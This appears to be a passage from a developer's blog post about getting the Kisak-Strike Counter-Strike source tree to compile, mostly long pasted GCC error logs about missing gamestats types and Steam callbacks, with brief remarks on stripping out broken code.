/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/steamworks_gamestats.cpp:417:93: error: ‘Steam_OnSteamSessionInfoClosed’ is not a member of ‘CSteamWorksGameStatsUploader’
  417 |   m_CallbackSteamSessionInfoClosed.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoClosed );
      |                                                                                             ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



```
{% endraw %}


After ripping that code out the compilation continues. We are basically just praying that nothing will call those functions, since they do not work. 😅

I have been removing this shit from the code for about two hours now and still no end in sight. I still don't even have the slightest clue about if this will even run correctly or just crash outright.

More errors. Good.

Here is the current list of errors:

{% raw %}
```
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:16:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/movehelper_server.cpp:18:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/basecsgrenade_projectile.cpp:27:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_playeranimstate.cpp:29:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_player_shared.cpp:37:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1782:1: error: ‘SWeaponHitData’ does not name a type; did you mean ‘WeaponStats’?
 1782 | SWeaponHitData::SWeaponHitData( CCSPlayer *pCSTarget, const CTakeDamageInfo &info, uint8 subBullet, uint8 round, uint8 iRecoilIndex )
      | ^~~~~~~~~~~~~~
      | WeaponStats
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1906:6: error: ‘SWeaponHitData’ has not been declared
 1906 | bool SWeaponHitData::InitAsGrenadeDetonation( CBaseCSGrenadeProjectile *pGrenade, uint32 unBulletGroup )
      |      ^~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp: In function ‘bool InitAsGrenadeDetonation(CBaseCSGrenadeProjectile*, uint32)’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1917:2: error: ‘m_ui8WeaponID’ was not declared in this scope; did you mean ‘CSWeaponID’?
 1917 |  m_ui8WeaponID = pGrenade->m_pWeaponInfo->m_weaponId;
      |  ^~~~~~~~~~~~~
      |  CSWeaponID
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1922:3: error: ‘m_vAttackerPos’ was not declared in this scope
 1922 |   m_vAttackerPos = pCSAttacker->GetAbsOrigin();
      |   ^~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1923:3: error: ‘m_ui64AttackerID’ was not declared in this scope
 1923 |   m_ui64AttackerID = GetPlayerID( pCSAttacker );
      |   ^~~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1923:22: error: ‘GetPlayerID’ was not declared in this scope
 1923 |   m_ui64AttackerID = GetPlayerID( pCSAttacker );
      |                      ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1927:2: error: ‘m_ui64TargertID’ was not declared in this scope
 1927 |  m_ui64TargertID = 0;
      |  ^~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1928:2: error: ‘m_vTargetPos’ was not declared in this scope
 1928 |  m_vTargetPos = pGrenade->GetAbsOrigin();
      |  ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1929:2: error: ‘m_uiBulletID’ was not declared in this scope
 1929 |  m_uiBulletID = unBulletGroup;
      |  ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1932:2: error: ‘m_HitRegion’ was not declared in this scope
 1932 |  m_HitRegion = pGrenade->m_unOGSExtraFlags;
      |  ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1934:2: error: ‘m_RoundID’ was not declared in this scope
 1934 |  m_RoundID = CSGameRules()->m_iTotalRoundsPlayed;
      |  ^~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gameinterface.cpp: In function ‘bool AddAccountToActiveCasters(const CSteamID&)’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gameinterface.cpp:302:60: error: ‘pszName’ was not declared in this scope
  302 |      ConMsg( "Adding %s (ID:%d) to active caster list!\n", pszName, steamID.GetAccountID() );
      |                                                            ^~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1939:3: error: ‘m_uiDamage’ was not declared in this scope; did you mean ‘g_MultiDamage’?
 1939 |   m_uiDamage = pFlash->m_numOpponentsHit;
      |   ^~~~~~~~~~
      |   g_MultiDamage
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1940:3: error: ‘m_ui8Health’ was not declared in this scope
 1940 |   m_ui8Health = pFlash->m_numTeammatesHit;
      |   ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1944:3: error: ‘m_uiDamage’ was not declared in this scope; did you mean ‘g_MultiDamage’?
 1944 |   m_uiDamage = 0;
      |   ^~~~~~~~~~
      |   g_MultiDamage
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1945:3: error: ‘m_ui8Health’ was not declared in this scope
 1945 |   m_ui8Health = 0;
      |   ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1949:2: error: ‘m_uiSubBulletID’ was not declared in this scope
 1949 |  m_uiSubBulletID = 0;
      |  ^~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1950:2: error: ‘m_uiRecoilIndex’ was not declared in this scope
 1950 |  m_uiRecoilIndex = 0;
      |  ^~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp: At global scope:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1954:6: error: ‘SWeaponHitData’ has not been declared
 1954 | bool SWeaponHitData::InitAsBombEvent( CCSPlayer *pCSPlayer, CPlantedC4 *pPlantedC4, uint32 unBulletGroup, uint8 unBombsite, CSBombEventName nBombEventID )
      |      ^~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp: In function ‘bool InitAsBombEvent(CCSPlayer*, CPlantedC4*, uint32, uint8, CSBombEventName)’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1966:2: error: ‘m_uiDamage’ was not declared in this scope; did you mean ‘g_MultiDamage’?
 1966 |  m_uiDamage = nBombEventID;
      |  ^~~~~~~~~~
      |  g_MultiDamage
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1973:4: error: ‘m_ui8WeaponID’ was not declared in this scope; did you mean ‘CSWeaponID’?
 1973 |    m_ui8WeaponID = (uint8)pPlantedC4ItemView->GetItemIndex();
      |    ^~~~~~~~~~~~~
      |    CSWeaponID
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1978:4: error: ‘m_ui64TargertID’ was not declared in this scope
 1978 |    m_ui64TargertID = GetPlayerID( pPlanter );
      |    ^~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1978:22: error: ‘GetPlayerID’ was not declared in this scope
 1978 |    m_ui64TargertID = GetPlayerID( pPlanter );
      |                      ^~~~~~~~~~~
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:3161: game/server/CMakeFiles/server_client.dir/movehelper_server.cpp.o] Error 1
make[2]: *** Waiting for unfinished jobs....
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1986:5: error: ‘m_ui64TargertID’ was not declared in this scope
 1986 |     m_ui64TargertID = GetPlayerID( pDefuser );
      |     ^~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1986:23: error: ‘GetPlayerID’ was not declared in this scope
 1986 |     m_ui64TargertID = GetPlayerID( pDefuser );
      |                       ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1991:2: error: ‘m_vTargetPos’ was not declared in this scope
 1991 |  m_vTargetPos = pPlantedC4->GetAbsOrigin(); //Record Bomb Location
      |  ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1996:3: error: ‘m_vAttackerPos’ was not declared in this scope
 1996 |   m_vAttackerPos = pCSPlayer->GetAbsOrigin();
      |   ^~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1997:3: error: ‘m_ui64AttackerID’ was not declared in this scope
 1997 |   m_ui64AttackerID = GetPlayerID( pCSPlayer );
      |   ^~~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:1997:22: error: ‘GetPlayerID’ was not declared in this scope
 1997 |   m_ui64AttackerID = GetPlayerID( pCSPlayer );
      |                      ^~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:2000:2: error: ‘m_uiBulletID’ was not declared in this scope
 2000 |  m_uiBulletID = unBulletGroup;
      |  ^~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:2005:2: error: ‘m_uAttackerMovement’ was not declared in this scope
 2005 |  m_uAttackerMovement = unBombsite;
      |  ^~~~~~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.cpp:2007:2: error: ‘m_RoundID’ was not declared in this scope
 2007 |  m_RoundID = CSGameRules()->m_iTotalRoundsPlayed;
      |  ^~~~~~~~~
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:61:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_gamerules.cpp:72:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:442:24: error: ‘SWeaponHitData’ has not been declared
  442 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6710: game/server/CMakeFiles/server_client.dir/__/shared/cstrike15/cs_playeranimstate.cpp.o] Error 1
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6502: game/server/CMakeFiles/server_client.dir/__/shared/cstrike15/basecsgrenade_projectile.cpp.o] Error 1
make[2]: *** [game/server/CMakeFiles/server_client.dir/build.make:6580: game/server/CMakeFiles/server_client.dir/cstrike15/cs_gameinterface.cpp.o] Error 1
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_gamerules.cpp: In member function ‘virtual void CCSGameRules::Think()’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_gamerules.cpp:9044:34: error: ‘steamgameserverapicontext’ was not declared in this scope; did you mean ‘CSteamGameServerAPIContext’?
 9044 |   if ( ( nCooldownMode <= 0 ) && steamgameserverapicontext && steamgameserverapicontext->SteamGameServer() && steamgameserverapicontext->SteamGameServer()->BSecure() )
      |                                  ^~~~~~~~~~~~~~~~~~~~~~~~~
      |                                  CSteamGameServerAPIContext
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_gamerules.cpp: In member function ‘virtual bool ClientJob_EMsgGCCStrike15_v2_MatchEndRewardDropsNotification::BYieldingRunJobFromMsg(GCSDK::IMsgNetPacket*)’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cs_gamerules.cpp:18485:49: warning: format ‘%llu’ expects argument of type ‘long long unsigned int’, but argument 3 has type ‘google::protobuf::uint64’ {aka ‘long unsigned int’} [-Wformat=]
18485 |    DevMsg( "Notification about user drop: %u %llu (%u-%u-%u)\n", msg.Body().iteminfo().accountid(), msg.Body().iteminfo().itemid(),
      |                                              ~~~^                                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      |                                                 |                                                                               |
      |                                                 long long unsigned int                                                          google::protobuf::uint64 {aka long unsigned int}
      |                                              %lu
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp: In member function ‘void CCSPlayer::ReportCustomClothingModels()’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:12749:33: error: qualified-id in declaration before ‘(’ token
12749 | bool CCSPlayer::HandleDropWeapon( CBaseCombatWeapon *pWeapon, bool bSwapping )
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:12854:30: error: qualified-id in declaration before ‘(’ token
12854 | void CCSPlayer::DestroyWeapon( CBaseCombatWeapon *pWeapon )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:12862:31: error: qualified-id in declaration before ‘(’ token
12862 | void CCSPlayer::DestroyWeapons( bool bDropC4 /* = true */ )
      |                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:12923:28: error: qualified-id in declaration before ‘(’ token
12923 | void CCSPlayer::DropWeapons( bool fromDeath, bool killedByEnemy )
      |                            ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13104:27: error: qualified-id in declaration before ‘(’ token
13104 | void CCSPlayer::ChangeTeam( int iTeamNum )
      |                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13288:27: error: qualified-id in declaration before ‘(’ token
13288 | void CCSPlayer::SwitchTeam( int iTeamNum )
      |                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13339:39: error: qualified-id in declaration before ‘(’ token
13339 | void CCSPlayer::ModifyOrAppendCriteria( AI_CriteriaSet& set )
      |                                       ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13359:45: error: qualified-id in declaration before ‘(’ token
13359 | void CCSPlayer::ModifyOrAppendPlayerCriteria( AI_CriteriaSet& set )
      |                                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13374:36: error: qualified-id in declaration before ‘(’ token
13374 | void CCSPlayer::StartNewBulletGroup()
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13379:33: error: qualified-id in declaration before ‘(’ token
13379 | uint32 CCSPlayer::GetBulletGroup()
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13384:33: error: qualified-id in declaration before ‘(’ token
13384 | void CCSPlayer::ResetBulletGroup()
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:41: error: expected primary-expression before ‘*’ token
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                         ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:43: error: ‘pPlayerDamager’ was not declared in this scope; did you mean ‘IPlayerManager’?
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                           ^~~~~~~~~~~~~~
      |                                           IPlayerManager
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:69: error: expected primary-expression before ‘*’ token
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                                                     ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:71: error: ‘pPlayerRecipient’ was not declared in this scope
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                                                       ^~~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:89: error: expected primary-expression before ‘int’
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                                                                         ^~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:102: error: expected primary-expression before ‘int’
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                                                                                      ^~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:116: error: expected primary-expression before ‘int’
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                                                                                                    ^~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:141: error: cannot call constructor ‘CDamageRecord::CDamageRecord’ directly [-fpermissive]
13389 | CDamageRecord::CDamageRecord( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient, int iDamage, int iCounter, int iActualHealthRemoved )
      |                                                                                                                                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13389:141: note: for a function-style cast, remove the redundant ‘::CDamageRecord’
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13419:67: error: qualified-id in declaration before ‘(’ token
13419 | bool CDamageRecord::IsDamageRecordStillValidForDamagerAndRecipient( CCSPlayer * pPlayerDamager, CCSPlayer * pPlayerRecipient )
      |                                                                   ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13435:29: error: qualified-id in declaration before ‘(’ token
13435 | void CCSPlayer::RecordDamage( CCSPlayer* damageDealer, CCSPlayer* damageTaker, int iDamageDealt, int iActualHealthRemoved )
      |                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13452:45: error: qualified-id in declaration before ‘(’ token
13452 | int CCSPlayer::GetNumAttackersFromDamageList( void )
      |                                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13464:46: error: qualified-id in declaration before ‘(’ token
13464 | int CCSPlayer::GetMostNumHitsDamageRecordFrom( CCSPlayer *pAttacker )
      |                                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13481:36: error: qualified-id in declaration before ‘(’ token
13481 | void CCSPlayer::ResetDamageCounters()
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13486:51: error: qualified-id in declaration before ‘(’ token
13486 | void CCSPlayer::RemoveSelfFromOthersDamageCounters()
      |                                                   ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13514:34: error: qualified-id in declaration before ‘(’ token
13514 | void CCSPlayer::OutputDamageTaken( void )
      |                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13552:34: error: qualified-id in declaration before ‘(’ token
13552 | void CCSPlayer::OutputDamageGiven( void )
      |                                  ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13606:45: error: qualified-id in declaration before ‘(’ token
13606 | void CCSPlayer::SendLastKillerDamageToClient( CCSPlayer *pLastKiller )
      |                                             ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13646:32: error: qualified-id in declaration before ‘(’ token
13646 | void CCSPlayer::CreateViewModel( int index /*=0*/ )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13665:22: error: qualified-id in declaration before ‘(’ token
13665 | bool CCSPlayer::HasC4() const
      |                      ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13670:47: error: qualified-id in declaration before ‘(’ token
13670 | int CCSPlayer::GetNextObserverSearchStartPoint( bool bReverse )
      |                                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13707:30: error: qualified-id in declaration before ‘(’ token
13707 | void CCSPlayer::PlayStepSound( Vector &vecOrigin, surfacedata_t *psurface, float fvol, bool force )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13728:36: error: qualified-id in declaration before ‘(’ token
13728 | void CCSPlayer::ModifyTauntDuration( float flTimingChange )
      |                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13735:32: error: qualified-id in declaration before ‘(’ token
13735 | void CCSPlayer::SelectDeathPose( const CTakeDamageInfo &info )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13767:32: error: qualified-id in declaration before ‘(’ token
13767 | void CCSPlayer::HandleAnimEvent( animevent_t *pEvent )
      |                                ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13806:30: error: qualified-id in declaration before ‘(’ token
13806 | bool CCSPlayer::CanChangeName( void )
      |                              ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13827:27: error: qualified-id in declaration before ‘(’ token
13827 | void CCSPlayer::ChangeName( const char *pszNewName )
      |                           ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13876:32: error: qualified-id in declaration before ‘(’ token
13876 | bool CCSPlayer::StartReplayMode( float fDelay, float fDuration, int iEntity )
      |                                ^
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/tier1.h:16,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier2/tier2.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier3/tier3.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/vphysics_interface.h:20,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cbase.h:46,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:8:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:4: error: cannot declare static function inside another function
 1122 |    static void name( const CCommand &args ); \
      |    ^~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13907:1: note: in expansion of macro ‘CON_COMMAND_F’
13907 | CON_COMMAND_F( replay_start, "Start GOTV replay: replay_start <delay> [<player name or index>]", FCVAR_CHEAT )
      | ^~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13908:1: error: a function-definition is not allowed here before ‘{’ token
13908 | {
      | ^
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/tier1.h:16,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier2/tier2.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier3/tier3.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/vphysics_interface.h:20,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cbase.h:46,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:8:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:4: error: cannot declare static function inside another function
 1122 |    static void name( const CCommand &args ); \
      |    ^~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13945:1: note: in expansion of macro ‘CON_COMMAND_F’
13945 | CON_COMMAND_F( replay_death, "start hltv replay of last death", FCVAR_CHEAT )
      | ^~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13946:1: error: a function-definition is not allowed here before ‘{’ token
13946 | {
      | ^
In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/tier1.h:16,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier2/tier2.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier3/tier3.h:15,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/vphysics_interface.h:20,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cbase.h:46,
                 from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:8:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/convar.h:1122:4: error: cannot declare static function inside another function
 1122 |    static void name( const CCommand &args ); \
      |    ^~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13958:1: note: in expansion of macro ‘CON_COMMAND_F’
13958 | CON_COMMAND_F( replay_stop, "stop hltv replay", FCVAR_GAMEDLL_FOR_REMOTE_CLIENTS )
      | ^~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13959:1: error: a function-definition is not allowed here before ‘{’ token
13959 | {
      | ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13968:31: error: qualified-id in declaration before ‘(’ token
13968 | void CCSPlayer::StopReplayMode()
      |                               ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13984:33: error: qualified-id in declaration before ‘(’ token
13984 | void CCSPlayer::PlayUseDenySound()
      |                                 ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:13992:52: error: qualified-id in declaration before ‘(’ token
13992 | void CCSPlayer::ResetRoundBasedAchievementVariables()
      |                                                    ^
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_player.cpp:14086:33: error: qualified-id in declaration before ‘(’ token
14086 | void CCSPlayer::HandleEndOfRound()
      |                                 ^
